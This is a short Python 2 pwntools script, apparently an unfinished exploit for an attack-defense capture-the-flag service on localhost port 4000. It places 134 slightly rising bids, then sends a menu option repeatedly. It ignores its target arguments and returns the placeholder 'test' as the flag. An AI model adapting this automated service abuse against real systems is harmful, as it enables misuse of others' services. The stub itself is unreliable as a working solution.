from pwn import *
import sys
import pexpect
import pexpect.fdpexpect


host = '127.0.0.1'
port = 4000

conn = remote(host, port)


def offer():
    print "start offer function"
    conn.sendline("1")

    msg = conn.recvuntil("offer?")
    print msg
    offer = msg[21:msg.find("$")]
    print offer
    offer_float = float(offer)

    conn.sendline("{0}".format(offer_float+0.1))
    print conn.recvuntil("?: ")
    print "end offer function"

def exploit(ip, port, flag_id):
    content = "test"

    print conn.recvuntil("?: ")

    for i in range(134):
        offer()

    conn.sendline("2\n")
    print conn.recv(4096)
    conn.sendline("2\n")
    print conn.recv(4096)
    conn.sendline("2\n")

    return {'FLAG': content}


if __name__ == "__main__":
    print exploit(host, port, "asdasd")
